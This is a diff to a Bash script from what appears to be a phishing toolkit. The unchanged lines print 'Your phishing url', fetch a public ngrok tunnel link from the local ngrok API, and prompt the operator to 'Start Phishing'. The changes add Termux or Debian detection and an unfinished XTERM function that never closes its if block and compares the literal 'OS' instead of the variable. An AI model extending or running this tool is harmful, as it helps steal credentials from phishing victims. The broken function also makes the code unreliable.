@@ -360,6 +360,8 @@ ash() {
         echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
 	echo
         }
+	
+	
 #####
 # OS
 #####
@@ -367,11 +369,18 @@ function os () {
 if [ -e $BIN/termux-info ]; then
 		BINDIR="${PREFIX}/bin/phs"
 		files="/sdcard"
+		OS=TERMUX
 	else
 	        BINDIR="/usr/bin/phs"
 		files="$HOME/Desktop"
+		OS=DEBIAN 
 fi
 }
+
+function XTERM () {
+if [ "OS" != "TERMUX" ]; then 
+
+
 
 #######
 # MAIN
@@ -449,7 +458,7 @@ echo
 			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
 			    ( sleep 6 ) &> /dev/null & spinner1
 			    ash 
-			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
+			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner			    
 			    clear
 			    shark_logo
 			    echo 
